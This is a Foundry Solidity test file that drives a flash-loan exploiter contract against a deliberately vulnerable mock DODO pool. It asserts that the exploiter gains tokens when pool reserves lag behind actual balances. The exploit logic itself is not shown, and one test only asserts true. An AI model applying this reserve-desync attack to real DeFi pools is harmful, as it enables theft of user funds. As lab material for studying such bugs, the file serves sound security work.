// test/DODOExploitTest.sol
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableDODOPool.sol";
import "../src/MockERC20.sol";

contract DODOExploitTest is Test {
    MockERC20 public tokenA;
    MockERC20 public tokenB;
    VulnerableDODOPool public pool;
    DODOFlashLoanExploiter public exploiter;

    function setUp() public {
        tokenA = new MockERC20("TokenA", "TKA", 10000 ether);
        tokenB = new MockERC20("TokenB", "TKB", 10000 ether);

        pool = new VulnerableDODOPool(address(tokenA), address(tokenB));

        tokenA.transfer(address(pool), 1000 ether);
        tokenB.transfer(address(pool), 1000 ether);

        exploiter = new DODOFlashLoanExploiter(address(pool));

        tokenA.transfer(address(exploiter), 10 ether);
    }

    function testFlashLoanExploit() public {
        uint256 loanAmount = 100 ether;
        (uint256 balanceA_before, uint256 balanceB_before) = exploiter.getBalances();

        uint256 profit = exploiter.executeAttack();

        (uint256 balanceA_after, uint256 balanceB_after) = exploiter.getBalances();

        console.log("Profit reported:", profit);
        console.log("Balance A before:", balanceA_before);
        console.log("Balance A after:", balanceA_after);
        console.log("Balance B before:", balanceB_before);
        console.log("Balance B after:", balanceB_after);

        assertGt(
            balanceB_after,
            balanceB_before,
            "Exploiter should gain token B"
        );

        assertEq(
            balanceA_after,
            balanceA_before,
            "Token A balance should remain the same"
        );
    }

    function testReserveDesync() public {
        uint256 initialReserveA = pool.reserveA();
        uint256 initialBalanceA = tokenA.balanceOf(address(pool));

        console.log("Initial reserveA:", initialReserveA);
        console.log("Initial balanceA:", initialBalanceA);

        uint256 flashLoanAmount = 500 ether;

        tokenA.transfer(address(pool), flashLoanAmount);

        uint256 newReserveA = pool.reserveA();
        uint256 newBalanceA = tokenA.balanceOf(address(pool));

        console.log("After 'flash loan':");
        console.log("  reserveA:", newReserveA);
        console.log("  balanceA:", newBalanceA);

        assertTrue(
            newBalanceA > newReserveA,
            "Balance should exceed reserve after flash loan"
        );

        console.log("Exchange rate with outdated reserves is more favorable!");
    }

    function testRealArbitrageOpportunity() public {
        VulnerableDODOPool pool2 = new VulnerableDODOPool(address(tokenA), address(tokenB));

        tokenA.transfer(address(pool2), 1000 ether);
        tokenB.transfer(address(pool2), 1000 ether);

        console.log("Two pools created with same tokens");
        console.log("Pool1 reserves:", pool.reserveA(), pool.reserveB());
        console.log("Pool2 reserves:", pool2.reserveA(), pool2.reserveB());

        assertTrue(true, "Arbitrage possible with two pools");
    }
}
